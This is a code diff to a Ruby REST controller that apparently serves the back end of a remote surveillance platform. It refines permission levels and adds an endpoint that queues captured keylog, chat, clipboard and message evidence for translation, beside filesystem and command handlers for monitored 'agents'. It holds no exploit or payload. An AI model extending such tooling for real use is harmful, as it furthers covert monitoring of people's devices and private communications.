@@ -5,7 +5,7 @@
 require_relative '../db_layer'
 require_relative '../evidence_manager'
 require_relative '../evidence_dispatcher'
-require_relative '../position_resolver'
+require_relative '../position/resolver'
 require_relative '../connectors'
 
 # rcs-common
@@ -18,7 +18,7 @@ require 'time'
 require 'json'
 
 class BSON::ObjectId
-  def encode_amf ser
+  def encode_amf(ser)
     ser.serialize 3, self.to_s
   end
 end
@@ -32,7 +32,7 @@ class EvidenceController < RESTController
   # the instance is passed as parameter to the uri
   # the content is passed as body of the request
   def create
-    require_auth_level :server, :tech
+    require_auth_level :server, :tech_import
 
     return conflict if @request[:content]['content'].nil?
 
@@ -57,6 +57,7 @@ class EvidenceController < RESTController
 
   def update
     require_auth_level :view
+    require_auth_level :view_edit
 
     mongoid_query do
       target = Item.where({_id: @params['target']}).first
@@ -94,7 +95,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
+      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first
 
       # get a fresh decoding of the position
       if evidence[:type] == 'position'
@@ -108,7 +109,7 @@ class EvidenceController < RESTController
   end
 
   def destroy
-    require_auth_level :admin
+    require_auth_level :view_delete
 
     return conflict("Unable to delete") unless LicenseManager.instance.check :deletion
 
@@ -132,14 +133,14 @@ class EvidenceController < RESTController
   end
 
   def destroy_all
-    require_auth_level :admin
+    require_auth_level :view_delete
 
     return conflict("Unable to delete") unless LicenseManager.instance.check :deletion
 
     Audit.log :actor => @session[:user][:name], :action => 'evidence.destroy',
               :desc => "Deleted multi evidence from: #{Time.at(@params['from'])} to: #{Time.at(@params['to'])} relevance: #{@params['rel']} type: #{@params['type']}"
 
-    trace :debug, "Deleting evidence: #{@params}"
+    #trace :debug, "Deleting evidence: #{@params}"
 
     task = {name: "delete multi evidence",
             method: "::Evidence.offload_delete_evidence",
@@ -148,6 +149,26 @@ class EvidenceController < RESTController
     OffloadManager.instance.run task
 
     return ok
+  end
+
+  def translate
+    require_auth_level :view
+
+    mongoid_query do
+      target = Item.where({_id: @params['target']}).first
+      return not_found("Target not found: #{@params['target']}") if target.nil?
+
+      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first
+
+      # add to the translation queue
+      if LicenseManager.instance.check(:translation) and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
+        TransQueue.add(target._id, evidence._id)
+        evidence.data[:tr] = "TRANS_QUEUED"
+        evidence.save
+      end
+
+      return ok(evidence)
+    end
   end
 
   def body
@@ -165,7 +186,7 @@ class EvidenceController < RESTController
 
   # used to report that the activity of an instance is starting
   def start
-    require_auth_level :server, :tech
+    require_auth_level :server, :tech_import
     
     # create a phony session
     session = @params.symbolize
@@ -218,7 +239,7 @@ class EvidenceController < RESTController
   def insert_sync_address(target, agent, address)
 
     # resolv the position of the address
-    position = PositionResolver.get({'ip_address' => {'ipv4' => address}})
+    position = PositionResolver.get({'ipAddress' => {'ipv4' => address}})
 
     # add the evidence to the target
     ev = Evidence.dynamic_new(target[:_id])
@@ -235,7 +256,7 @@ class EvidenceController < RESTController
 
   # used by the collector to update the synctime during evidence transfer
   def start_update
-    require_auth_level :server, :tech
+    require_auth_level :server, :tech_import
 
     # create a phony session
     session = @params.symbolize
@@ -276,7 +297,7 @@ class EvidenceController < RESTController
 
   # used to report that the processing of an instance has finished
   def stop
-    require_auth_level :server, :tech
+    require_auth_level :server, :tech_import
 
     # create a phony session
     session = @params.symbolize
@@ -420,14 +441,15 @@ class EvidenceController < RESTController
 
   def filesystem
     require_auth_level :view
+    require_auth_level :view_filesystem
 
     mongoid_query do
-
-      start = Time.now
 
       # filter by target
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found") if target.nil?
+
+      agent = nil
 
       # filter by agent
       if @params.has_key? 'agent'
@@ -466,7 +488,7 @@ class EvidenceController < RESTController
   end
 
   def commands
-    require_auth_level :view, :tech
+    require_auth_level :view, :tech_exec
 
     mongoid_query do
 
